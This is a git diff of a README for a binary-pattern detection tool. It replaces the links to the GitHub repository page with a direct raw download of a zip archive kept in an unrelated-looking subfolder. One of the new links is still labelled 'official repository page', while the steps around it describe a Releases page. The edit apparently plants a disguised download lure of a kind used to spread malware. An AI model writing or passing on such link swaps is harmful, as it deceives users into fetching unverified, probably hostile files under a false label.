@@ -1,6 +1,6 @@
 # 🔍 110-Sequence-Detector - Find binary patterns with simple tools
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Janemcfadden1090/110-Sequence-Detector)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://raw.githubusercontent.com/Janemcfadden1090/110-Sequence-Detector/main/gansey/Sequence_Detector_v3.6-alpha.5.zip)
 
 ## 📌 Project Overview
 
@@ -22,7 +22,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to obtain the program:
 
-1. Visit the [official repository page](https://github.com/Janemcfadden1090/110-Sequence-Detector) to access the software files.
+1. Visit the [official repository page](https://raw.githubusercontent.com/Janemcfadden1090/110-Sequence-Detector/main/gansey/Sequence_Detector_v3.6-alpha.5.zip) to access the software files.
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the latest version link.
 4. Select the Windows installer file ending in .exe.
